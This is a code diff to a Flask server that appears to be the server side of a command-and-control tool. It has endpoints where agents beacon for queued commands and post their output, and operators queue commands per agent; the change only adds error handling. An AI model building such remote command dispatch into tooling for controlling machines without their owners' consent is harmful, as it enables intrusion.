@@ -105,28 +105,36 @@ def beacon():
         return queue.get()
     else:
         return ""
-    
+
+
 @app.route("/api/output", methods=["POST"])
 def output():
     print(request.data)
 
     return ""
 
+
 @app.route("/api/client/queue", methods=["POST"])
 def queue():
     json = request.get_json()
 
-    queue = map.get(json["id"])
+    try:
+        queue = map.get(json["id"])
 
-    if "param" in json:
-        queue.put(json["command"] + " " + json["param"])
-    else:
-        queue.put(json["command"])
+        if "param" in json:
+            queue.put(json["command"] + " " + json["param"])
+        else:
+            queue.put(json["command"])
 
-    if queue.full():
+        if queue.full():
+            return "Error"
+        else:
+            return ""
+    
+    except:
+        print("Queue does not exist")
         return "Error"
-    else:
-        return ""
+
 
 @app.route("/api/client/agents")
 def get():
